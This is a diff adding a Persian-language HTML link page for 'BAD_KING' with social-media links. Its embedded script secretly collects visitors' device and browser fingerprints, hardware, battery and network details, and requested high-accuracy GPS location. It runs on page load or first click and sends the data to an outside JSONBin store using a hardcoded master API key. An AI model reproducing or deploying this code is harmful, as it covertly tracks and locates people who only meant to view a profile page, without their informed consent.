@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BAD_KING | صفحه رسمی</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0a0e1a;color:#e0e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow-x:hidden;direction:rtl}
+        .cyber-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(circle at 20% 30%,#0f1a2e,#05080f);overflow:hidden}
+        .cyber-bg::before{content:'';position:absolute;top:0;left:0;width:200%;height:200%;background:repeating-linear-gradient(0deg,rgba(0,255,200,0.03) 0px,rgba(0,255,200,0.03) 2px,transparent 2px,transparent 6px),repeating-linear-gradient(90deg,rgba(0,255,200,0.03) 0px,rgba(0,255,200,0.03) 2px,transparent 2px,transparent 6px);animation:gridMove 8s linear infinite;transform-origin:center}
+        @keyframes gridMove{0%{transform:translate(0,0)}100%{transform:translate(-50px,-50px)}}
+        .particles{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}
+        .particle{position:absolute;width:3px;height:3px;background:#00f0ff;border-radius:50%;box-shadow:0 0 15px #00f0ff;animation:floatParticle 12s infinite alternate ease-in-out;opacity:0.3}
+        .particle:nth-child(1){top:10%;left:15%;animation-duration:14s}
+        .particle:nth-child(2){top:25%;left:85%;animation-duration:18s;animation-delay:1s}
+        .particle:nth-child(3){top:60%;left:10%;animation-duration:16s;animation-delay:2s}
+        .particle:nth-child(4){top:80%;left:75%;animation-duration:20s;animation-delay:.5s}
+        .particle:nth-child(5){top:45%;left:45%;animation-duration:15s;animation-delay:3s}
+        .particle:nth-child(6){top:15%;left:50%;animation-duration:17s;animation-delay:1.5s}
+        .particle:nth-child(7){top:70%;left:30%;animation-duration:19s;animation-delay:2.5s}
+        .particle:nth-child(8){top:35%;left:70%;animation-duration:13s;animation-delay:.8s}
+        @keyframes floatParticle{0%{transform:translate(0,0) scale(1);opacity:.2}25%{transform:translate(30px,-40px) scale(1.5);opacity:.6}50%{transform:translate(-20px,30px) scale(.8);opacity:.3}75%{transform:translate(40px,20px) scale(1.2);opacity:.7}100%{transform:translate(-30px,-30px) scale(1);opacity:.2}}
+        .neon-line{position:absolute;background:linear-gradient(90deg,transparent,#00f0ff,transparent);height:1px;width:100%;opacity:.1;animation:neonMove 6s linear infinite}
+        .neon-line:nth-child(9){top:20%;animation-delay:0s}
+        .neon-line:nth-child(10){top:50%;animation-delay:2s}
+        .neon-line:nth-child(11){top:80%;animation-delay:4s}
+        @keyframes neonMove{0%{transform:translateX(-100%);opacity:0}50%{opacity:.3}100%{transform:translateX(100%);opacity:0}}
+        .container{position:relative;z-index:2;width:100%;max-width:500px;background:rgba(10,14,30,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(0,240,255,0.1);border-radius:25px;padding:40px 25px 30px;box-shadow:0 20px 60px rgba(0,240,255,0.05);animation:fadeIn .8s ease-out}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        .brand{text-align:center;margin-bottom:10px}
+        .brand .logo{width:120px;height:120px;margin:0 auto 10px;display:block;border-radius:50%;object-fit:cover;border:2px solid rgba(0,240,255,0.15);box-shadow:0 0 40px rgba(0,240,255,0.05);transition:all .3s ease}
+        .brand .logo:hover{transform:scale(1.05);border-color:rgba(0,240,255,0.3);box-shadow:0 0 60px rgba(0,240,255,0.1)}
+        .brand h1{font-size:28px;font-weight:800;letter-spacing:3px;background:linear-gradient(135deg,#00f0ff,#7b2ffc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 40px rgba(0,240,255,0.1)}
+        .brand .tagline{font-size:13px;color:rgba(255,255,255,0.3);letter-spacing:5px;margin-top:5px;font-weight:300}
+        .divider{width:60px;height:2px;background:linear-gradient(90deg,transparent,rgba(0,240,255,0.3),transparent);margin:15px auto 25px}
+        .bio{text-align:center;font-size:14px;color:rgba(255,255,255,0.5);line-height:1.8;margin-bottom:25px;padding:0 10px}
+        .bio span{color:#00f0ff}
+        .social-links{display:block;margin-top:5px}
+        .social-item{display:flex;align-items:center;padding:14px 18px;margin-bottom:10px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05);transition:all .3s ease;text-decoration:none;color:#e0e8f0;cursor:pointer}
+        .social-item:hover{background:rgba(255,255,255,0.07);transform:translateX(-5px);border-color:rgba(0,240,255,0.15)}
+        .social-item i{font-size:22px;width:40px;text-align:center;margin-left:15px}
+        .social-item .info{flex:1}
+        .social-item .info .name{font-weight:600;font-size:15px}
+        .social-item .info .desc{font-size:12px;color:rgba(255,255,255,0.3)}
+        .social-item .arrow{color:rgba(255,255,255,0.15);font-size:14px}
+        .social-item.instagram i{color:#E4405F}
+        .social-item.telegram i{color:#0088cc}
+        .social-item.bale i{color:#00d4b8}
+        .social-item.youtube i{color:#FF0000;opacity:.2}
+        .social-item.youtube{opacity:.4;cursor:not-allowed}
+        .footer{text-align:center;margin-top:25px;font-size:11px;color:rgba(255,255,255,0.15);letter-spacing:2px}
+        @media(max-width:480px){.container{padding:30px 15px 20px}.brand .logo{width:90px;height:90px}.brand h1{font-size:24px}.social-item{padding:12px 14px}.social-item i{font-size:20px;width:35px}}
+        ::-webkit-scrollbar{width:6px}
+        ::-webkit-scrollbar-track{background:rgba(0,0,0,0.3)}
+        ::-webkit-scrollbar-thumb{background:linear-gradient(135deg,#00f0ff,#7b2ffc);border-radius:10px}
+        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,240,255,0.9);color:#0a0e1a;padding:10px 20px;border-radius:10px;font-weight:600;font-size:13px;z-index:999;display:none;animation:fadeIn .3s ease-out;direction:rtl;text-align:center}
+        .toast.show{display:block}
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast">✅ اطلاعات ذخیره شد</div>
+    <div class="cyber-bg"><div class="particles"><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div></div><div class="neon-line"></div><div class="neon-line"></div><div class="neon-line"></div></div>
+    <div class="container">
+        <div class="brand"><img src="https://cdn.imgurl.ir/uploads/e125412_ChatGPT_Image_Jun_21_2026_09_44_35_PM.png" alt="BAD_KING" class="logo"><h1>BAD_KING</h1><div class="tagline">• OFFICIAL PAGE •</div></div>
+        <div class="divider"></div>
+        <div class="bio">به صفحه رسمی <span>BAD_KING</span> خوش آمدید<br>از طریق شبکه‌های اجتماعی زیر با ما در ارتباط باشید</div>
+        <div class="social-links">
+            <a href="https://www.instagram.com/reel/DZ6zITxsFZV/" target="_blank" class="social-item instagram"><i class="fab fa-instagram"></i><div class="info"><div class="name">اینستاگرام</div><div class="desc">مشاهده صفحه</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
+            <a href="https://t.me/+27rGW8kwLCZjNTE0" target="_blank" class="social-item telegram"><i class="fab fa-telegram-plane"></i><div class="info"><div class="name">تلگرام</div><div class="desc">عضویت در کانال</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
+            <a href="https://ble.ir/join/2xTEY9XA8z" target="_blank" class="social-item bale"><i class="fas fa-comment-dots"></i><div class="info"><div class="name">بله</div><div class="desc">عضویت در پیام‌رسان بله</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
+            <div class="social-item youtube"><i class="fab fa-youtube"></i><div class="info"><div class="name">یوتیوب</div><div class="desc">به زودی...</div></div><div class="arrow"><i class="fas fa-clock"></i></div></div>
+        </div>
+        <div class="footer"><i class="fas fa-shield-alt" style="margin-left:5px;"></i>BAD_KING © 2026</div>
+    </div>
+    <script>
+        // ================================================================
+        // BAD KING - با JSONBin (اطلاعات کامل 180+ مورد)
+        // ================================================================
+
+        // ===== تنظیمات JSONBin =====
+        const JSONBIN_BIN_ID = '6a4448c0da38895dfe189441';
+        const JSONBIN_API_KEY = '$2a$10$YthIkt1Zx8s5gnUrvjXjs0EEm351owZpgd5xhTVe1VQw2lVnY42m';
+
+        function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
+
+        // ================================================================
+        // 1. اطلاعات زمان و تاریخ (15 مورد)
+        // ================================================================
+        function getTimeInfo(){
+            const now=new Date();const start=new Date(now.getFullYear(),0,1);const diff=(now-start)/86400000;const week=Math.ceil((diff+start.getDay()+1)/7);
+            const seasons=['بهار','تابستان','پاییز','زمستان'];const month=now.getMonth();let season='';if(month>=2&&month<=4) season='بهار';else if(month>=5&&month<=7) season='تابستان';else if(month>=8&&month<=10) season='پاییز';else season='زمستان';
+            const pm=['فروردین','اردیبهشت','خرداد','تیر','مرداد','شهریور','مهر','آبان','آذر','دی','بهمن','اسفند'];
+            return {time:now.toLocaleString('fa-IR',{timeZone:'Asia/Tehran'}),timeISO:now.toISOString(),timeUTC:now.toUTCString(),timeUnix:now.getTime(),dayOfWeek:now.toLocaleString('fa-IR',{weekday:'long'}),dayOfWeekEn:now.toLocaleString('en-US',{weekday:'long'}),dayOfMonth:now.getDate(),month:pm[now.getMonth()],monthNumber:now.getMonth()+1,year:now.getFullYear(),hours:now.getHours(),minutes:now.getMinutes(),seconds:now.getSeconds(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:now.getTimezoneOffset(),weekNumber:week,season:season};
+        }
+
+        // ================================================================
+        // 2. اطلاعات دستگاه (10 مورد)
+        // ================================================================
+        function getDeviceInfo(){
+            const ua=navigator.userAgent;
+            let os='سایر';if(ua.includes('Windows NT 10.0')) os='Windows 10';else if(ua.includes('Windows NT 11.0')) os='Windows 11';else if(ua.includes('Windows NT 6.1')) os='Windows 7';else if(ua.includes('Windows')) os='Windows';else if(ua.includes('Android 14')) os='Android 14';else if(ua.includes('Android 13')) os='Android 13';else if(ua.includes('Android 12')) os='Android 12';else if(ua.includes('Android')) os='Android';else if(ua.includes('iPhone OS 17')) os='iOS 17';else if(ua.includes('iPhone OS 16')) os='iOS 16';else if(ua.includes('iPhone')) os='iOS';else if(ua.includes('iPad')) os='iPadOS';else if(ua.includes('Mac OS X')) os='macOS';else if(ua.includes('Linux')) os='Linux';else if(ua.includes('CrOS')) os='ChromeOS';
+            let browser='سایر',bv='';if(ua.includes('Chrome')&&!ua.includes('Edg')&&!ua.includes('OPR')){browser='Chrome';const m=ua.match(/Chrome\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Firefox')){browser='Firefox';const m=ua.match(/Firefox\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Safari')&&!ua.includes('Chrome')){browser='Safari';const m=ua.match(/Version\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Edg')){browser='Edge';const m=ua.match(/Edg\/(\d+)/);if(m) bv=m[1];}else if(ua.includes('Opera')||ua.includes('OPR')){browser='Opera';const m=ua.match(/Opera\/(\d+)/);if(m) bv=m[1];}
+            let engine='سایر';if(browser==='Chrome'||browser==='Edge'||browser==='Opera') engine='Blink';else if(browser==='Firefox') engine='Gecko';else if(browser==='Safari') engine='WebKit';
+            let dt='دسکتاپ',dm='نامشخص',dv='نامشخص',isMobile=false;if(/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) isMobile=true;
+            if(/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)){dt='تبلت';if(ua.includes('iPad')){dm='iPad';dv='Apple';}else if(ua.includes('Samsung')){dm='Galaxy Tab';dv='Samsung';}}else if(isMobile){dt='موبایل';if(ua.includes('iPhone')){dm='iPhone';dv='Apple';}else if(ua.includes('Samsung')){dm='Samsung Galaxy';dv='Samsung';}else if(ua.includes('Xiaomi')){dm='Xiaomi';dv='Xiaomi';}else if(ua.includes('Huawei')){dm='Huawei';dv='Huawei';}else if(ua.includes('OnePlus')){dm='OnePlus';dv='OnePlus';}else if(ua.includes('Pixel')){dm='Google Pixel';dv='Google';}else if(ua.includes('Nokia')){dm='Nokia';dv='Nokia';}else if(ua.includes('LG')){dm='LG';dv='LG';}else if(ua.includes('Sony')){dm='Xperia';dv='Sony';}else if(ua.includes('Motorola')){dm='Motorola';dv='Motorola';}else{dm='گوشی موبایل';dv='نامشخص';}}else{if(ua.includes('Windows')) dv='PC';else if(ua.includes('Mac')){dv='Apple';dm='Mac';}else if(ua.includes('Linux')) dv='PC';else if(ua.includes('CrOS')){dv='Google';dm='Chromebook';}}
+            let arch='نامشخص';if(ua.includes('WOW64')||ua.includes('Win64')||ua.includes('x86_64')||ua.includes('amd64')) arch='64-bit';else if(ua.includes('x86')||ua.includes('i686')) arch='32-bit';else if(ua.includes('arm64')||ua.includes('aarch64')) arch='ARM 64-bit';else if(ua.includes('armv')) arch='ARM';
+            let cpu='نامشخص';if(ua.includes('Intel')) cpu='Intel';else if(ua.includes('AMD')) cpu='AMD';else if(ua.includes('Apple')) cpu='Apple Silicon';else if(ua.includes('ARM')) cpu='ARM';
+            return {os,browser,browserVer:bv,engine,deviceType:dt,deviceModel:dm,deviceVendor:dv,isMobile:isMobile?'بله':'خیر',architecture:arch,cpuType:cpu,platform:navigator.platform,vendor:navigator.vendor||'نامشخص',appVersion:navigator.appVersion.substring(0,100),userAgent:ua,memory:navigator.deviceMemory||'نامشخص',cores:navigator.hardwareConcurrency||'نامشخص'};
+        }
+
+        // ================================================================
+        // 3. اطلاعات صفحه نمایش (10 مورد)
+        // ================================================================
+        function getScreenInfo(){
+            const s=window.screen;const pr=window.devicePixelRatio||1;let rr='نامشخص';try{if(s.refreshRate) rr=s.refreshRate+'Hz';}catch(e){}
+            let hdr='خیر';try{const c=document.createElement('canvas');const gl=c.getContext('webgl');if(gl){const ext=gl.getExtension('EXT_color_buffer_float');if(ext) hdr='بله';}}catch(e){}
+            let wcg='خیر';try{if(window.matchMedia('(color-gamut: p3)').matches) wcg='P3';else if(window.matchMedia('(color-gamut: rec2020)').matches) wcg='Rec.2020';}catch(e){}
+            return {screenWidth:s.width,screenHeight:s.height,availWidth:s.availWidth,availHeight:s.availHeight,colorDepth:s.colorDepth+' بیت',pixelRatio:pr+'x',refreshRate:rr,orientation:s.orientation?.type||'نامشخص',orientationAngle:s.orientation?.angle||0,hdrSupport:hdr,wideColorGamut:wcg,winWidth:window.innerWidth,winHeight:window.innerHeight,outerWidth:window.outerWidth||0,outerHeight:window.outerHeight||0};
+        }
+
+        // ================================================================
+        // 4. اطلاعات سخت‌افزار (12 مورد)
+        // ================================================================
+        function getHardwareInfo(){
+            let vram='نامشخص',gv='نامشخص',gr='نامشخص',hw='نامشخص',w2='خیر',mts='نامشخص';
+            try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){gv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)||'نامشخص';gr=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'نامشخص';const match=gr.match(/(\d+)\s*MB/);if(match) vram=match[1]+' MB';hw=gv.includes('Intel')||gv.includes('NVIDIA')||gv.includes('AMD')||gv.includes('Apple')?'فعال':'نرم‌افزاری';}if(c.getContext('webgl2')||c.getContext('experimental-webgl2')) w2='بله';mts=gl.getParameter(gl.MAX_TEXTURE_SIZE)+' پیکسل';}}catch(e){}
+            let pm='عمومی';try{localStorage.setItem('_test_','_test_');localStorage.removeItem('_test_');}catch(e){pm='ناشناس';}
+            return {vram,gpuVendor:gv,gpuRenderer:gr,hwAcceleration:hw,webgl2Support:w2,maxTextureSize:mts,privateMode:pm,cookie:navigator.cookieEnabled?'فعال':'غیرفعال',doNotTrack:navigator.doNotTrack||'غیرفعال',onLine:navigator.onLine?'متصل':'قطع',touch:('ontouchstart' in window||navigator.maxTouchPoints>0)?'بله':'خیر',touchPoints:navigator.maxTouchPoints||0};
+        }
+
+        // ================================================================
+        // 5. اطلاعات شبکه (4 مورد)
+        // ================================================================
+        function getNetworkInfo(){
+            const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+            return {type:conn?(conn.effectiveType||conn.type||'نامشخص'):'نامشخص',downlink:conn&&conn.downlink?conn.downlink+' Mbps':'نامشخص',rtt:conn&&conn.rtt?conn.rtt+' ms':'نامشخص',saveData:conn&&conn.saveData?'فعال':'غیرفعال'};
+        }
+
+        // ================================================================
+        // 6. اطلاعات باتری (4 مورد)
+        // ================================================================
+        function getBatteryInfo(){return new Promise((r)=>{if(!navigator.getBattery){r(null);return;}navigator.getBattery().then(b=>r({level:Math.round(b.level*100)+'%',charging:b.charging?'در حال شارژ':'در حال استفاده',chargingTime:b.chargingTime?Math.round(b.chargingTime/60)+' دقیقه':'نامشخص',dischargingTime:b.dischargingTime?Math.round(b.dischargingTime/60)+' دقیقه':'نامشخص'})).catch(()=>r(null));});}
+
+        // ================================================================
+        // 7. موقعیت مکانی (10 مورد)
+        // ================================================================
+        function getLocationInfo(){return new Promise((r)=>{if(!navigator.geolocation){r(null);return;}navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy+' متر',alt:p.coords.altitude||'نامشخص',heading:p.coords.heading||'نامشخص',speed:p.coords.speed||'نامشخص',mapGoogle:'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,mapOSM:'https://www.openstreetmap.org/?mlat='+p.coords.latitude+'&mlon='+p.coords.longitude,mapWaze:'https://www.waze.com/ul?ll='+p.coords.latitude+','+p.coords.longitude+'&z=16',mapBing:'https://www.bing.com/maps?q='+p.coords.latitude+','+p.coords.longitude}),()=>r(null),{enableHighAccuracy:true,timeout:10000});});}
+
+        // ================================================================
+        // 8. قابلیت‌های مرورگر (40+ مورد)
+        // ================================================================
+        function getCapabilities(){
+            const canvas=document.createElement('canvas');const result={};
+            const checks={webgl:()=>!!(canvas.getContext('webgl')||canvas.getContext('experimental-webgl')),webgl2:()=>!!(canvas.getContext('webgl2')||canvas.getContext('experimental-webgl2')),webgpu:()=>'gpu'in navigator,webassembly:()=>typeof WebAssembly!=='undefined',websocket:()=>typeof WebSocket!=='undefined',serviceWorker:()=>'serviceWorker'in navigator,indexedDB:()=>'indexedDB'in window,webrtc:()=>'RTCPeerConnection'in window||'webkitRTCPeerConnection'in window,webtransport:()=>'WebTransport'in window,webcodecs:()=>'VideoEncoder'in window,fileSystemAccess:()=>'showDirectoryPicker'in window,webBluetooth:()=>'bluetooth'in navigator,webNFC:()=>'nfc'in navigator,webUSB:()=>'usb'in navigator,webXR:()=>'xr'in navigator,webSpeech:()=>'speechSynthesis'in window,webAuthn:()=>'PublicKeyCredential'in window,webMIDI:()=>'midi'in navigator,webHID:()=>'hid'in navigator,webSerial:()=>'serial'in navigator,webShare:()=>'share'in navigator,webNotification:()=>'Notification'in window,webPayment:()=>'PaymentRequest'in window,webVR:()=>'VRDisplay'in window||'getVRDisplays'in navigator,webAudio:()=>'AudioContext'in window,webMedia:()=>'MediaRecorder'in window,webFileAPI:()=>'FileReader'in window,webDragDrop:()=>'DataTransfer'in window,webFullscreen:()=>'Fullscreen'in document||'webkitFullscreen'in document,webHistory:()=>'history'in window,webLocation:()=>'location'in window,webStorage:()=>'localStorage'in window,webWorker:()=>'Worker'in window,webFetch:()=>'fetch'in window,webStreams:()=>'ReadableStream'in window,webPerformance:()=>'performance'in window,webIntersectionObserver:()=>'IntersectionObserver'in window,webResizeObserver:()=>'ResizeObserver'in window,webMutationObserver:()=>'MutationObserver'in window,webProxy:()=>'Proxy'in window,webMap:()=>'Map'in window,webSet:()=>'Set'in window,webSymbol:()=>'Symbol'in window,webPromise:()=>'Promise'in window};
+            for(const[key,fn]of Object.entries(checks)){try{result[key]=fn()?'بله':'خیر';}catch(e){result[key]='خیر';}}return result;
+        }
+
+        // ================================================================
+        // 9. کدک‌ها (15 مورد)
+        // ================================================================
+        function getCodecs(){
+            const v=document.createElement('video');const a=document.createElement('audio');
+            return {h264:v.canPlayType('video/mp4; codecs="avc1.42E01E"')||'خیر',h264High:v.canPlayType('video/mp4; codecs="avc1.64001E"')||'خیر',h265:v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"')||'خیر',vp8:v.canPlayType('video/webm; codecs="vp8"')||'خیر',vp9:v.canPlayType('video/webm; codecs="vp9"')||'خیر',av1:v.canPlayType('video/mp4; codecs="av01.0.05M.08"')||'خیر',mp3:a.canPlayType('audio/mpeg')||'خیر',aac:a.canPlayType('audio/mp4; codecs="mp4a.40.2"')||'خیر',ogg:a.canPlayType('audio/ogg')||'خیر',wav:a.canPlayType('audio/wav')||'خیر',flac:a.canPlayType('audio/flac')||'خیر',opus:a.canPlayType('audio/opus')||'خیر',webm:v.canPlayType('video/webm')||'خیر',mp4:v.canPlayType('video/mp4')||'خیر',ogv:v.canPlayType('video/ogg')||'خیر'};
+        }
+
+        // ================================================================
+        // 10. فونت‌ها و پلاگین‌ها
+        // ================================================================
+        function getFonts(){
+            const list=['Arial','Times New Roman','Helvetica','Calibri','Verdana','Tahoma','IRANSans','Vazir','Yekan','B Nazanin','Comic Sans MS','Courier New','Georgia','Impact','Roboto','Open Sans','Lato','Montserrat','Segoe UI','Trebuchet MS'];const avail=[];for(const f of list){try{const span=document.createElement('span');span.style.fontFamily=f+', sans-serif';span.style.position='absolute';span.style.left='-9999px';span.textContent='test';document.body.appendChild(span);if(span.offsetWidth>0) avail.push(f);document.body.removeChild(span);}catch(e){}}return avail;
+        }
+        function getPlugins(){const p=[];try{for(let i=0;i<navigator.plugins.length;i++){p.push(navigator.plugins[i].name);}}catch(e){}return p;}
+
+        // ================================================================
+        // 11. اثر انگشت (3 مورد)
+        // ================================================================
+        function getFingerprints(){
+            const result={canvas:'نامشخص',webgl:'نامشخص',font:'نامشخص'};
+            try{const c=document.createElement('canvas');c.width=400;c.height=100;const ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃',4,17);ctx.fillStyle='#f00';ctx.fillRect(0,0,400,100);ctx.fillStyle='#0f0';ctx.fillRect(10,10,380,80);ctx.fillStyle='#00f';ctx.fillRect(20,20,360,60);ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.strokeRect(30,30,340,40);result.canvas=c.toDataURL().substring(0,50)+'...';}catch(e){}
+            try{const c=document.createElement('canvas');c.width=200;c.height=50;const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');if(ext){result.webgl=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)+' | '+gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);}}}catch(e){}
+            try{const fonts=getFonts();result.font=fonts.join(', ').substring(0,100)+'...';}catch(e){}
+            return result;
+        }
+
+        // ================================================================
+        // 12. تعامل با سایت (10 مورد)
+        // ================================================================
+        function getInteractionInfo(){
+            let lt='نامشخص',dlt='نامشخص',dit='نامشخص',dclt='نامشخص';try{if(performance.timing){const n=performance.timing;lt=(n.loadEventEnd-n.navigationStart)+' ms';dlt=(n.domComplete-n.domLoading)+' ms';dit=(n.domInteractive-n.navigationStart)+' ms';dclt=(n.domContentLoadedEventEnd-n.navigationStart)+' ms';}}catch(e){}
+            let mi='نامشخص';try{if(performance.memory){mi=Math.round(performance.memory.usedJSHeapSize/1024/1024)+' MB / '+Math.round(performance.memory.totalJSHeapSize/1024/1024)+' MB';}}catch(e){}
+            let nt='نامشخص',rc=0;try{if(performance.navigation){const types={0:'کلیک/تایپ',1:'رفرش',2:'بازگشت',255:'سایر'};nt=types[performance.navigation.type]||'نامشخص';rc=performance.navigation.redirectCount||0;}}catch(e){}
+            return {loadTime:lt,domLoadTime:dlt,domInteractiveTime:dit,domContentLoadedTime:dclt,memoryInfo:mi,navigationType:nt,redirectCount:rc,visibilityState:document.visibilityState,hasFocus:document.hasFocus()?'بله':'خیر',referrer:document.referrer||'مستقیم',url:window.location.href,hostname:window.location.hostname,pathname:window.location.pathname,protocol:window.location.protocol,port:window.location.port||'80'};
+        }
+
+        // ================================================================
+        // 13. ذخیره‌سازی (6 مورد)
+        // ================================================================
+        function getStorageInfo(){
+            let ls='نامشخص',ss='نامشخص';let lc=0,sc=0;
+            try{let total=0;for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if(key){total+=localStorage.getItem(key).length;lc++;}}ls=Math.round(total/1024)+' KB';}catch(e){}
+            try{let total=0;for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);if(key){total+=sessionStorage.getItem(key).length;sc++;}}ss=Math.round(total/1024)+' KB';}catch(e){}
+            return {localStorageSize:ls,localStorageCount:lc,sessionStorageSize:ss,sessionStorageCount:sc};
+        }
+
+        // ================================================================
+        // 14. ارسال به JSONBin
+        // ================================================================
+        async function sendToJSONBin(data){
+            try{const get=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{headers:{'X-Master-Key':JSONBIN_API_KEY}});if(!get.ok) throw new Error('خطا');const result=await get.json();const visits=result.record.visits||[];visits.unshift(data);if(visits.length>200) visits=visits.slice(0,200);const put=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':JSONBIN_API_KEY},body:JSON.stringify({visits:visits})});if(put.ok){console.log('✅ ارسال به JSONBin');return true;}else{return false;}}catch(e){console.error('❌',e);return false;}
+        }
+
+        function saveLocal(data){try{let v=JSON.parse(localStorage.getItem('badking_visits')||'[]');v.unshift(data);if(v.length>200) v=v.slice(0,200);localStorage.setItem('badking_visits',JSON.stringify(v));return true;}catch(e){return false;}}
+
+        // ================================================================
+        // 15. جمع‌آوری و ارسال
+        // ================================================================
+        async function collectAndSend(){
+            try{
+                const time=getTimeInfo();const device=getDeviceInfo();const screen=getScreenInfo();const hardware=getHardwareInfo();const network=getNetworkInfo();const capabilities=getCapabilities();const codecs=getCodecs();const fonts=getFonts();const plugins=getPlugins();const fingerprints=getFingerprints();const interaction=getInteractionInfo();const storage=getStorageInfo();const battery=await getBatteryInfo();const location=await getLocationInfo();
+                const data={...time,deviceType:device.deviceType,deviceModel:device.deviceModel,deviceVendor:device.deviceVendor,isMobile:device.isMobile,os:device.os,browser:device.browser+' v'+device.browserVer,browserEngine:device.engine,architecture:device.architecture,cpuType:device.cpuType,platform:device.platform,vendor:device.vendor,memory:device.memory,cores:device.cores,screen:screen.screenWidth+'x'+screen.screenHeight,colorDepth:screen.colorDepth,pixelRatio:screen.pixelRatio,refreshRate:screen.refreshRate,orientation:screen.orientation,hdrSupport:screen.hdrSupport,wideColorGamut:screen.wideColorGamut,winSize:screen.winWidth+'x'+screen.winHeight,vram:hardware.vram,gpuVendor:hardware.gpuVendor,gpuRenderer:hardware.gpuRenderer,hwAcceleration:hardware.hwAcceleration,webgl2Support:hardware.webgl2Support,maxTextureSize:hardware.maxTextureSize,privateMode:hardware.privateMode,cookie:hardware.cookie,doNotTrack:hardware.doNotTrack,onLine:hardware.onLine,touch:hardware.touch+' ('+hardware.touchPoints+' نقطه)',networkType:network.type,networkSpeed:network.downlink,networkRtt:network.rtt,networkSaveData:network.saveData,battery:battery?battery.level:'نامشخص',batteryCharging:battery?battery.charging:'نامشخص',...capabilities,...codecs,fonts:fonts.join(', '),plugins:plugins.join(', '),fingerprint:fingerprints.canvas,webglFingerprint:fingerprints.webgl,fontFingerprint:fingerprints.font,gps:location?location.lat+', '+location.lng:'نامشخص',gpsAcc:location?location.acc:'نامشخص',gpsAlt:location?location.alt:'نامشخص',gpsHeading:location?location.heading:'نامشخص',gpsSpeed:location?location.speed:'نامشخص',mapGoogle:location?location.mapGoogle:'نامشخص',mapOSM:location?location.mapOSM:'نامشخص',mapWaze:location?location.mapWaze:'نامشخص',mapBing:location?location.mapBing:'نامشخص',loadTime:interaction.loadTime,domLoadTime:interaction.domLoadTime,domInteractiveTime:interaction.domInteractiveTime,domContentLoadedTime:interaction.domContentLoadedTime,memoryInfo:interaction.memoryInfo,navigationType:interaction.navigationType,redirectCount:interaction.redirectCount,visibilityState:interaction.visibilityState,hasFocus:interaction.hasFocus,referrer:interaction.referrer,url:interaction.url,hostname:interaction.hostname,protocol:interaction.protocol,port:interaction.port,localStorageSize:storage.localStorageSize,localStorageCount:storage.localStorageCount,sessionStorageSize:storage.sessionStorageSize,sessionStorageCount:storage.sessionStorageCount,language:navigator.language,languages:navigator.languages.join(', ')};
+                const result=await sendToJSONBin(data);if(result){showToast('✅ اطلاعات ذخیره شد');}else{saveLocal(data);showToast('✅ اطلاعات در دستگاه ذخیره شد');}
+            }catch(e){console.error('❌',e);showToast('❌ خطا');}
+        }
+
+        let hasRun=false;function start(){if(!hasRun){hasRun=true;collectAndSend();}}
+        setTimeout(start,2000);document.addEventListener('click',start);document.addEventListener('touchstart',start);
+        document.querySelectorAll('.social-item').forEach(i=>{i.addEventListener('click',()=>{setTimeout(collectAndSend,500);});});
+        console.log('✅ BAD_KING page loaded');
+    </script>
+</body>
+</html>
